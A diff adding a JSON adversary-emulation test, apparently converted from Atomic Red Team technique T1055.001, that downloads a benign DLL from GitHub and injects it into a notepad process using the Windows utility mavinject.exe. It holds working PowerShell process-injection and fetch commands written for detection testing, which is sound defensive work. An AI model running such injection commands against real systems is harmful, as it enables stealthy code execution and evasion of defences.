@@ -1,0 +1,92 @@
+{
+  "id": "74496461-11a1-4982-b439-4d87a550d254",
+  "name": "Process Injection via mavinject.exe",
+  "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ebdb256b-24ef-44cb-8d71-24b05e547349",
+      "type": "execute-command",
+      "data": {
+        "command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "03075187-4eb0-451e-ad1f-43e9bd03b254",
+      "name": "Check dependency 1/1",
+      "description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "2b1c862d-f4ed-4735-b3ab-0f0e5be7a306",
+      "name": "Resolve dependency 1/1",
+      "description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll\" -OutFile \"#{dll_payload}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a0f3cba8-8f11-41a1-ab0c-926063cef079",
+      "name": "Re-check dependency 1/1",
+      "description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "03075187-4eb0-451e-ad1f-43e9bd03b254",
+      "p": "on-success",
+      "o": "ebdb256b-24ef-44cb-8d71-24b05e547349"
+    },
+    {
+      "s": "03075187-4eb0-451e-ad1f-43e9bd03b254",
+      "p": "on-failure",
+      "o": "2b1c862d-f4ed-4735-b3ab-0f0e5be7a306"
+    },
+    {
+      "s": "2b1c862d-f4ed-4735-b3ab-0f0e5be7a306",
+      "p": "on-success",
+      "o": "a0f3cba8-8f11-41a1-ab0c-926063cef079"
+    },
+    {
+      "s": "a0f3cba8-8f11-41a1-ab0c-926063cef079",
+      "p": "on-failure",
+      "o": "ebdb256b-24ef-44cb-8d71-24b05e547349"
+    }
+  ],
+  "tags": [
+    "T1055.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "process_id",
+      "type": "string",
+      "description": "PID of input_arguments",
+      "value": "(Start-Process notepad -PassThru).id"
+    },
+    {
+      "name": "dll_payload",
+      "type": "path",
+      "description": "DLL to Inject",
+      "value": "PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll"
+    }
+  ]
+}
